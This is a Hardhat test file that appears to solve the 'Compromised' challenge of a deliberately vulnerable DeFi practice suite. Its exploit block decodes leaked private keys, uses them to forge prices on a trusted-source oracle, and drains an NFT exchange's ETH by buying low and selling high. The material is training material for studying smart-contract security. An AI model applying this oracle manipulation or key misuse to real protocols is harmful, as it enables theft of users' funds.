const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        /**
        The server response is just encoded values. When decoded, these look like private addresses. These were found (decoded):
        0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

        These are public keys for the above private keys (in order):
        0xe92401A4d3af5E446d93D11EEc806b1462b39D15
        0x81A5D6E50C214044bE44cA0CB057fe119097850c

        These look like the trusted sources for the Oracle. How convenient!

        Now it's just a matter of hijacking the price oracle, getting whatever price we want to buy/sell NFTs ("DVNFT") for.
         */
        const [trustedSource1, trustedSource2] = [
            (new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9")).connect(ethers.provider),
            (new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48")).connect(ethers.provider)
        ];


        // 1. Manipulate price oracle and reduce price to low
        await (await this.oracle.connect(trustedSource1).postPrice("DVNFT", 0)).wait();
        await (await this.oracle.connect(trustedSource2).postPrice("DVNFT", 0)).wait();

        // 2. Buy NFT at low price
        const lowPrice = ethers.utils.parseEther("0.0000001");
        const { events } = await (await this.exchange.connect(attacker).buyOne({ value: lowPrice })).wait();
        const { tokenId } = events.find(({ event }) => event === "TokenBought").args;
        console.log(`NFT bought at low price with ID: ${tokenId.toString()}`);

        // 3. Manipulate price oracle and increase price to whatever exchange balance is
        const exchangeBalance = await ethers.provider.getBalance(this.exchange.address);
        await (await this.oracle.connect(trustedSource1).postPrice("DVNFT", exchangeBalance)).wait();
        await (await this.oracle.connect(trustedSource2).postPrice("DVNFT", exchangeBalance)).wait();

        // 4. Sell NFT at this high price
        await (await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId)).wait();
        await (await this.exchange.connect(attacker).sellOne(tokenId)).wait();
        console.log(`Purchased NFT sold at price: ${ethers.utils.formatEther(exchangeBalance)} ETH`);

        // 5. Set NFT price at initial rate
        await (await this.oracle.connect(trustedSource1).postPrice("DVNFT", INITIAL_NFT_PRICE)).wait();
        await (await this.oracle.connect(trustedSource2).postPrice("DVNFT", INITIAL_NFT_PRICE)).wait();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');

        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
